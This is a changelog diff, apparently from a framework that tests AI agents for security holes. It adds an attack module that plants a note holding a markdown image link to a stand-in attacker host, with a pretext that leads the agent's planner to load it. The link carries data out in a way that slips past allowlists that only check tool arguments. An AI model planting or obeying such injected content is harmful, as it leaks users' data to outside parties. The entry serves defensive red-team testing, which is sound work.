@@ -9,6 +9,14 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Added
 
+- **Markdown image/link egress probe (W3).** New opt-in attack module,
+  `markdown_egress`, closing issue #130: plants a note whose markdown embeds
+  an attacker-controlled image URL (`![](http://attacker.example.com/...)`)
+  alongside an in-character reason for the planner to resolve it. The
+  destination travels as formatted content rather than a named tool
+  argument, so allowlists that only inspect declared arguments to a known
+  sink can miss it. Reuses the shared `egress_reached_probe_destination`
+  predicate; ships no new oracle.
 - **Contributor guardrails.** The repository now defends the machinery that
   checks contributions, not just the contributions. Relevant if you are opening
   a pull request: see the new
